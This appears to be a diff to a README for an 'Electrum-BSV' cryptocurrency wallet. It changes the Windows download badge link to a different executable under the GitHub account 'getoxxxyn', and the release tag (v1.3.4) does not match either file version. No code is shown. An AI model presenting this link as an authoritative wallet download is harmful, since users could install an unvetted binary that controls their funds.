@@ -18,7 +18,7 @@ Electrum-BSV is a fast and secure Bitcoin SV (BSV) wallet designed for high perf
       <tr>
         <td style="padding: 12px; vertical-align: middle;">Windows</td>
         <td style="padding: 12px; text-align: center;">
-          <a href="https://github.com/getoxxxyn/Electrum-BSV/releases/download/v1.3.4/electrum-bsv-1.3.16.exe" style="text-decoration: none;">
+          <a href="https://github.com/getoxxxyn/Electrum-BSV/releases/download/v1.3.4/electrum-bsv-1.3.1.exe" style="text-decoration: none;">
             <img src="https://img.shields.io/badge/Electrum%20BSV-Windows-0078D6?style=for-the-badge&logo=windows"
                  alt="Download Electrum BSV for Windows" />
           </a>
